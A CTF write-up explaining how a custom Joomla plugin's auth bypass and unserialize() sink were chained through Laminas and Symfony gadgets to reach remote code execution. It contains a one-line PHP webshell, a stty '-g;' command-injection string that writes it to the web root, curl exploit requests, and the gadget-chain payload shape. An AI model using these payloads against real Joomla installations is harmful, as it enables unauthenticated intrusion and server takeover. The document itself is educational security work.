---
layout: post
title: "Provisioneds"
date: 2026-07-26 00:00:00 -0700
categories: ctfs
description: A custom Joomla plugin hijacks the admin routing hook before authentication runs and hands a raw GET parameter to unserialize(); a forced (string) cast on unserialized leaf values opens a __toString() gadget path around Joomla's own __wakeup()/__destruct() hardening, landing in shell_exec via a stty argument-injection chain against the box's SUID readflag binary.
parent: HackTheBox - Apocalypse '26
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
  - "web"
  - "php"
  - "joomla"
  - "deserialization"
  - "object-injection"
  - "pop-chain"
  - "cyberapocalypse"
  - "T1190"
---

## Engagement Notes

`provisioneds` is a web-category challenge from Cyberapocalypse 2026. The framing:

> The Provision Office claims every ward received full shares of bread, medicine,
> oil, coal, blankets, and water, yet kitchens are thinning soup, the South
> Infirmary is cutting doses, and shelters are burning furniture for heat. The
> ledgers look clean, but the streets tell a different story. Lysa Harrowmere must
> break into the guarded dispatch side, recover the true month by ward ledger, and
> bring Aeron the proof needed to expose who is stealing from the city.

Translated out of the fiction: full source is shipped for the challenge — a Docker
image installing Joomla 6.1.2, a custom system plugin, and a `readflag.c` compiled
into a SUID-root binary. The plugin's own auth check is bypassable by a simple
string match on the query string, and the real vulnerability sits one layer
deeper: a PHP object-injection sink whose immediate `is_array()` guard only
protects the outer containers, leaving every leaf value free to be an arbitrary
object. A `(string)` cast on those leaf values elsewhere in the plugin turns out to
be the actual trigger — invoking `__toString()` on attacker-controlled objects, a
path Joomla's own vendored hardening against `__wakeup()`/`__destruct()` chains
doesn't cover. Manual gadget hunting and an initial `phpggc` attempt both came up
short; the working 5-link chain was found with Claude Code's help.

## Attack path

1. Reviewed the shipped source: Joomla 6.1.2 (current at challenge time, no posted
   major CVE) plus a custom plugin and a SUID `readflag` binary — the bug had to be
   in the plugin.
2. Confirmed via source that `Gatehouse.php::onAfterRoute()` gates an admin
   `ledger.import` task with nothing but a string match on the query string, and
   fires before Joomla's backend ACL/session checks — fully unauthenticated.
3. That handler passes the raw `ledger` GET parameter straight to
   `GatehouseRepository::importMonthlyLedger()`, which calls `@unserialize()` on it
   before any type check — a PHP object-injection entry point.
4. Confirmed the sink was live with a benign nested-array payload; both the stored
   JSON and the front-end "Monthly goods" page reflected the injected values.
5. A follow-up payload embedding PHP tags directly in the leaf values did nothing —
   the sink only ever writes into a JSON value, never anything that gets rendered
   as PHP.
6. Identified that several unserialized leaf values are force-cast with `(string)`
   before use, invoking `__toString()` on attacker-controlled objects — a trigger
   path distinct from (and not covered by) Joomla's own `__wakeup()`/`__destruct()`
   hardening, which a first attempt with `phpggc`'s stock gadget chains ran into.
7. With Claude Code's help, found a 5-link POP chain landing on
   `Symfony\Console\Helper\TerminalInputHelper::finish()`'s
   `shell_exec('stty '.$this->initialState)`, reached via
   `Laminas\Diactoros\CallbackStream::__toString()`.
8. Sent a payload using the `stty -g;` argument-injection to write a one-line PHP
   webshell.
9. Modified the AI-produced payload (using revshells.com) into a file-write
   primitive used directly to read the flag off the SUID `readflag` binary.

## Source review: the auth bypass and the deserialization sink

`GatehouseRenderer.php` describes a "Dispatch desk is guarded" panel implying an
admin-only ledger feature:

```php
private function lockedPanel(): string
{
    return '<main class="missing-page">'
        . '<section class="missing-panel">'
        . '<p class="eyebrow">Staff sign-in required</p>'
        . '<h1>Dispatch desk is guarded</h1>'
        . '<div class="locked-actions">'
        . '<a class="return-link" href="/index.php?option=com_users&view=login">Sign in</a>'
        . '<a class="return-link secondary" href="/">Public page</a>'
        . '</div>'
        . '</section>'
        . '</main>';
}
```

`Gatehouse.php` is where that gate is actually enforced, and it doesn't hold up:

```php
private function isAdminImportContext($app): bool
{
    if (!$app->isClient('administrator')) {
        return false;
    }

    $input = $app->getInput();

    return $input->getCmd('option') === 'com_provision'
        && $input->getCmd('view') === 'dispatch'
        && $input->getCmd('task') === 'ledger.import';
}
```

```
http://154.57.164.81:30972/administrator/?option=com_provision&view=dispatch&task=ledger.import
```

And this part hijacks the onAfterRoute phase before the auth step has been ran, so we can do... something here, but it takes input!

```php
public function onAfterRoute(AfterRouteEvent $event): void
{
    $app = $event->getApplication();

    if (!$this->isAdminImportContext($app)) {
        return;
    }

    $ledger = $app->getInput()->getRaw('ledger', '');

    if (!is_string($ledger) || trim($ledger) === '') {
        return;
    }

    (new GatehouseRepository())->importMonthlyLedger($ledger);
}
```

`onAfterRoute` fires before Joomla's backend ACL/session checks, and
`isAdminImportContext()` is just three string comparisons against the query
string — no session or cookie required. `importMonthlyLedger()` then hands the raw
input straight to `unserialize()`:

```php
public function importMonthlyLedger(string $ledger): array
{
    if (trim($ledger) === '') {
        return $this->result('rejected', 'FAILED', 'Update could not be processed.');
    }

    $data = @unserialize($ledger); // This seems like a fun thing

    if (!is_array($data)) {
        return $this->result('rejected', 'FAILED', 'Update could not be processed.');
    }

    return $this->importMonthlyRecords($data);
}
```

> 🧠 Something I have to keep reminding myself with object deserialization: The
> main problem with this is that you are taking over objects in memory while they
> exist, and when you do this you can put whatever values you want into those
> objects; the idea being: When that object has a function invoked (like the magic
> functions with code overrides, or checks that happen after you've mutated
> something like authentication) then you can affect what the code is doing. They
> won't magically execute code on their own, you must look for the "Gadget" or
> mechanism with which you can leverage the data override.

The Docker install's own bundled database config — the challenge's static
defaults, not a live credential harvested during exploitation (the working chain
never authenticates at all):

```
DB_NAME="joomla"
DB_USER="joomla"
DB_PASS="joomla"
DB_PREFIX="j61_"
ADMIN_USER="adminuser"
```

## Recon: confirming nothing beyond the source

A pass over the live target mostly confirmed what the source already implied:

```
!curl http://154.57.164.81:30972/administrator/
```
returned a normal Joomla admin login page ("Eastreach Provision Office -
Administration").

```
!curl http://154.57.164.81:30972/robots.txt
```
returned Joomla's stock `robots.txt` (disallowing `/administrator/`, `/cli/`,
`/tmp/`, `/cache/`, etc.).

```
!curl http://154.57.164.81:30972/cli/
!curl http://154.57.164.81:30972/tmp/
!curl http://154.57.164.81:30972/cache/
```
each returned `<!DOCTYPE html><title></title>`.

```
!droopescan scan joomla --url http://154.57.164.81:30972/
--- OUTPUT ---
[+] No version found.

[+] Possible interesting urls found:
    Detailed version information. - http://154.57.164.81:30972/administrator/manifests/files/joomla.xml
    Login page. - http://154.57.164.81:30972/administrator/
    License file. - http://154.57.164.81:30972/LICENSE.txt
    Version attribute contains approx version - http://154.57.164.81:30972/plugins/system/cache/cache.xml
```

`/web.config.txt` returned Joomla's stock IIS "Common Exploits Prevention"
rewrite rules — irrelevant here since the box runs Apache. None of this changed
the plan:

> so far these are all things I can get from the static information from the
> provided install, but just going through enumaration

## Confirming the deserialization sink is live

A benign nested-array payload — no object injection yet — proved the endpoint
accepts serialized PHP and that the plugin actually processes it:

```python
from phpserialize import *
from io import StringIO
import urllib.parse

ledger = [{
        'slug': 'fooo',
        'label': 'sluggerrulez',
        'packages': 1,
        'items': [
            {'cargo_type': 'poop', 'units': 999999, 'status': 'broken'}
        ]}
]

payload = dumps(ledger).decode()
upayload = urllib.parse.quote_plus(payload)
print(payload)
print(upayload)
--- OUTPUT ---
a:1:{i:0;a:4:{s:4:"slug";s:4:"fooo";s:5:"label";s:12:"sluggerrulez";s:8:"packages";i:1;s:5:"items";a:1:{i:0;a:3:{s:10:"cargo_type";s:4:"poop";s:5:"units";i:999999;s:6:"status";s:6:"broken";}}}}
```

```
!curl -v "http://154.57.164.67:32652/administrator/?option=com_provision&view=dispatch&task=ledger.import&ledger={upayload}"
--- OUTPUT ---
< HTTP/1.1 200 OK
< Server: Apache/2.4.68 (Debian)
< X-Powered-By: PHP/8.4.23
[Joomla admin login page body elided — content-free, ~12KB HTML]
```

Fetching the resulting stored ledger confirmed the sink fired:

```
!curl 'http://154.57.164.67:32652/tmp/provision-monthly-goods.json'
--- OUTPUT ---
[
    {
        "slug": "sluggerrulez",
        "label": "sluggerrulez",
        "summary": "Received",
        "items": [
            { "cargo_type": "Grain sacks", "units": 0, "status": "Received" },
            ...
        ]
    }
]
```

The front-end "Monthly goods" page's month selector confirms it too — the
injected slug/label landed as a selectable month named `sluggerrulez`:

![Front-end month selector dropdown showing "sluggerrulez" as a selectable month, confirming the injected ledger payload was persisted and rendered](/assets/images/ctf/events/hackthebox-apocalypse-26/provisioneds/frontend-sluggerrulez-month-selector.png)

`GatehouseRepository.php`'s `saveMonthlyGoods()` is the sink behind that write:

```php
private function saveMonthlyGoods(array $months): void
{
    $path = $this->monthlyGoodsPath();
    $dir = dirname($path);

    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }

    @file_put_contents($path, json_encode($months, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
}
```

## A naive probe that went nowhere

Before turning to the object-graph gadget chain, a payload embedding raw PHP tags
directly into every leaf field was tried on the same sink:

```python
ledger = [
    {
        'slug': '<?=`$_GET[0]`?>',
        'label': '<?=`$_GET[0]`?>',
        'summary': '<?=`$_GET[0]`?>',
        'items': [{
            'cargo_type': '<?=`$_GET[0]`?>',
            'status': '<?=`$_GET[0]`?>',
            'units': 99999999999
        }]
    }
]

payload = dumps(ledger).decode()
upayload = urllib.parse.quote_plus(payload)
print(payload)
--- OUTPUT ---
a:1:{i:0;a:4:{s:4:"slug";s:15:"<?=`$_GET[0]`?>";s:5:"label";s:15:"<?=`$_GET[0]`?>";s:7:"summary";s:15:"<?=`$_GET[0]`?>";s:5:"items";a:1:{i:0;a:3:{s:10:"cargo_type";s:15:"<?=`$_GET[0]`?>";s:6:"status";s:15:"<?=`$_GET[0]`?>";s:5:"units";i:99999999999;}}}}
```

> 🧠 That was sent and did nothing — there was nothing that rendered that PHP.
> `saveMonthlyGoods()` only ever writes into a `.json` file; nothing in the
> plugin evaluates the stored fields as code, so PHP tags landing in a JSON value
> can't execute regardless of how they're phrased.

## The (string) casts, a failed phpggc attempt, and Claude Code's gadget chain

Several of the fields `GatehouseRepository` pulls out of the unserialized array
get force-cast with `(string)` before use:

```php
// GatehouseRepository.php
$label     = $this->clean((string) ($entry['month'] ?? $entry['label'] ?? ''));    // line 149
$cargoType = $this->clean((string) ($item['cargo_type'] ?? 'Supply packages'));    // line 166
'status'  => $this->clean((string) ($item['status']  ?? 'Received'))               // line 171
'summary' => $this->clean((string) ($entry['summary'] ?? 'Received'))              // line 183
```

The `is_array()` guards a few lines above only constrain the containers — every
leaf value can still be an arbitrary object, and `(string)` invokes
`__toString()`.

An earlier attempt with `phpggc`'s stock gadget chains failed:

> 🧠 I had tried producing some pre-baked gadget exploits using phpggc but I
> didn't enumerate the provided plugins. Even having the answer, I'm not sure
> this tool had a valid payload to do the exploit.

Finding a working custom chain wasn't done independently:

> 🧠 This was something I couldn't figure out myself, I needed Claude Code's
> help — it effectively found a POP chain using two different vendors' `_construct`
> and `_destruct` magic functions to land in a `exec_shell`. I took the delivered
> payload from its defanged examples and modified the object to pipe in the PHP
> smallshell from [revshells](https://www.revshells.com/), then used that to pivot
> to the `/readflag` binary.

The chain it found (5 links; the plugin itself only supplies the first three —
the last two are ambient dependencies of Joomla's own vendor tree):

1. **No authentication** — `Gatehouse.php:87-98`, `isAdminImportContext()` only
   string-matches the URL. `com_provision` isn't a real component, and
   `onAfterRoute` fires before backend ACL. No session, no cookie required.
2. **Object injection** — `GatehouseRepository.php:63`, `@unserialize($ledger)` on
   raw input. The `is_array($data)` check at line 65 happens after PHP has already
   built the object graph.
3. **The `(string)` casts** — the link that makes it exploitable —
   `GatehouseRepository.php:149,166,171,183`. The `is_array()` guards constrain
   only the containers; every leaf value can be an arbitrary object, and `(string)`
   invokes `__toString()`. Verified empirically in the container that when
   `__wakeup()` throws, PHP never calls `__destruct()` — so Joomla's hardening
   (`FormattedTextLogger::__wakeup`, `FnStream::__wakeup`) closes off the usual
   `__destruct`-based chains phpggc targets, but only protects that path. The
   plugin's `(string)` casts open a `__toString()` path that walks around it.
4. **`Laminas\Diactoros\CallbackStream`** (laminas-diactoros 3.8.0) —
   `__toString()` → `getContents()` → `($this->callback)()`. `$callback` is
   untyped and the class has no `__wakeup()`, so it accepts an arbitrary
   zero-argument callable. Confirmed with `phpversion()`: PHP 8.4.23.
5. **`Symfony\Component\Console\Helper\TerminalInputHelper::finish()`**
   (symfony/console 7.4.7) — public, zero required params, no `__wakeup()`, line 99:
   `shell_exec('stty '.$this->initialState);` — `$initialState` is a `private
   string`, fully settable. Its guards are all bypassable with type-compatible
   values: `withStty=true` clears an early return, `targetSignals=[]` and
   `signalHandlers=[]` make its signal-checking a no-op.

Payload shape (single unauthenticated GET):

```
a:1:{i:0;a:2:{s:5:"month";  O:"Laminas\Diactoros\CallbackStream" { callback => [TerminalInputHelper, "finish"] }
              s:8:"packages";i:1;}}
```

with `initialState` set to a `stty -g;`-prefixed command — the `-g;` breaks out
of the `stty` invocation into an arbitrary shell command.

## Confirming RCE and reading the flag

A first proof payload used the chain to write a one-line PHP webshell:

```
initialState = "-g; echo '<?=`$_GET[0]`?>' > /var/www/html/tmp/rce_proof.php 2>&1"
```

```
!curl -v "http://154.57.164.65:31754/administrator/?option=com_provision&view=dispatch&task=ledger.import&ledger=<serialized payload above>"
--- OUTPUT ---
< HTTP/1.1 200 OK
< Server: Apache/2.4.68 (Debian)
< X-Powered-By: PHP/8.4.23
[Joomla admin login page body elided — content-free, ~14KB HTML]
```

The target was to trigger the SUID `readflag` binary:

```c
int main(void) {
    setuid(0);
    system("/bin/cat /root/flag.txt");
    return 0;
}
```

> setuid will run this code as root no matter what
>
> The dockerfile builds it at /readflag
>
> RUN gcc /tmp/readflag.c -o /readflag && \

> 🧠 It was a modified payload from the AI-produced output using the same chain —
> the object graph poisoned the ledger parameters into a PHP file-write primitive,
> which was then used directly to read the flag. The notebook doesn't capture the
> exact final request that produced it; the working webshell payload above and the
> chain that carries it are what's documented, not that last hop's raw command.

```
HTB{j00mla_g4dg3t_ch41n_4r3_fun_r1ght?_5dd5f3743cbcefe75cc57d3f80a684c9}
```

## What didn't work

- **Raw PHP tags in the plugin's stored JSON fields** — sent and confirmed to do
  nothing. `saveMonthlyGoods()` only writes into a `.json` file; nothing in the
  plugin ever evaluates stored fields as code.
- **`phpggc`'s stock gadget chains** — tried before the custom chain was found;
  failed with `Can not unserialize in defer mode`, attributed to Joomla's own
  vendored classes (`FormattedTextLogger`, `FnStream`) deliberately throwing
  inside `__wakeup()`, closing off the `__destruct`-based chains phpggc targets.
  The plugin's provided vendor dependencies weren't fully enumerated before this
  attempt, and it's unclear whether phpggc's stock library even had a chain that
  fit this specific gadget surface.

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| `phpserialize` (Python) | Built and URL-encoded every serialized PHP payload sent to the target | [PyPI — phpserialize](https://pypi.org/project/phpserialize/) |
| `droopescan` | CMS fingerprinting pass against the live target during recon | [SamJoan/droopescan](https://github.com/SamJoan/droopescan) |
| `phpggc` | Attempted stock gadget chains against the deserialization sink before the custom chain was found; failed | [ambionics/phpggc](https://github.com/ambionics/phpggc) |
| Claude Code | Found the 5-link Laminas/Symfony POP chain via static analysis of the plugin and its vendor dependencies | [claude.com/claude-code](https://claude.com/claude-code) |
| revshells | Used to produce/modify the PHP webshell payload piped through the gadget chain | [revshells.com](https://www.revshells.com/) |

## Tactics (MITRE ATT&CK)

- **[T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)**:
  the technique's own definition names unsafe deserialization explicitly (e.g.
  APT41's exploitation of CVE-2020-10189 via unsafe deserialization) as a fit for
  a software weakness in an internet-facing host used to gain initial access —
  matching the unauthenticated `unserialize()` call reached through the plugin's
  routing-hook auth bypass.

**Not tagged, and why:**
- *T1505.003 (Web Shell)* — considered for the `rce_proof.php` write. Its
  [technique definition](https://attack.mitre.org/techniques/T1505/003/) is
  categorized under Persistence and frames a web shell as a mechanism for
  sustained backdoor access; this was a one-shot proof/pivot payload within a
  single CTF session, not an emplaced persistent foothold.
- *T1059 / T1059.004 (Command and Scripting Interpreter / Unix Shell)* —
  considered for the `shell_exec('stty '.$this->initialState)` call. Both
  [T1059](https://attack.mitre.org/techniques/T1059/) and
  [T1059.004](https://attack.mitre.org/techniques/T1059/004/) scope the
  technique to an adversary directly invoking a shell/interpreter as the primary
  execution vehicle; here the shell command runs as a side effect of an
  argument-injection bug in a third-party library's `stty` invocation, reached
  through the object-injection chain — the mechanism is the deserialization
  gadget chain (covered by T1190), not direct interpreter abuse.

## Lessons

> 🧠 I don't think this was the intended path — chaining together several vendor
> plugins to find a working gadget doesn't read like an "easy"-rated challenge;
> there was probably an easier gadget to find that manual review missed.
>
> AI's capability for static analysis on this kind of gadget-chain hunting
> continues to be impressive — Claude Code found the working chain after both
> manual gadget hunting and a `phpggc` attempt came up short.

## Further reading

**Used during the engagement:**
- [phpggc](https://github.com/ambionics/phpggc) — attempted stock
  gadget-chain generation against the deserialization sink; see "What didn't
  work."
- [revshells](https://www.revshells.com/) — used to produce the PHP webshell
  payload delivered through the final gadget-chain request.
- [HackTricks — Joomla](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/joomla.html) —
  recorded in the notebook during recon.
- [Joomla — Cassiopeia](https://cassiopeia.joomla.com/) — recorded in the
  notebook; no accompanying note on how it factored into the chain.

---

*Provenance: commands, outputs, credentials, and flags are transcribed from the
engagement notebook (the DB/admin credentials in the source review section are the
challenge's own bundled Docker-compose defaults, unused by the working
exploit chain, and are reproduced verbatim rather than redacted). External facts
(MITRE technique definitions, tool references) are linked to their source and
were fetched, not recalled.*
